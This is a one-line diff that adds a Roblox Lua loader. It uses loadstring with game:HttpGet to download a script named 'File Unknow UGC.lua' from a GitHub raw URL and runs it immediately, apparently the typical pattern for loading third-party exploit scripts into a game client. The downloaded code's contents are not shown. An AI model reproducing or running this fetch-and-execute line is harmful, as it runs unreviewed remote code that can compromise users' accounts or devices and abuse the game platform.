@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/Robloxiansx/UGC/main/File%20Unknow%20UGC.lua'),true))()
